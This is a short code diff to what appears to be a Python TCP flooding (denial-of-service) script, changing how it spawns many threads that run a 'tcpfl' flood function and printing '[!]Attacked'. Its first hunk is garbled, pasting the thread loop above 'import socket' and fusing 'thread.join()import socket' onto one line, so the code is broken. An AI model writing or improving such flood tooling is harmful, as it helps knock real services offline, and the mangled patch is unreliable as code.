@@ -1,4 +1,12 @@
-import socket
+threads = []
+    for _ in range(th):
+        if method == "TCP":
+            t = threading.Thread(target=tcpfl)
+            threads.append(t)
+            t.start()
+
+    for thread in threads:
+        thread.join()import socket
 import random
 import datetime
 import threading
@@ -191,7 +199,12 @@ if method == "TCP":
             except Exception as e:
                 print("[!]Attacked")
                 
+    threads = []
+    for _ in range(th):
         if method == "TCP":
-            with ThreadPoolExecutor(max_workers=th) as executor:
-                for _ in range(th):
-                    executor.submit(tcpfl, ip, port)
+            t = threading.Thread(target=tcpfl)
+            threads.append(t)
+            t.start()
+
+    for thread in threads:
+        thread.join()
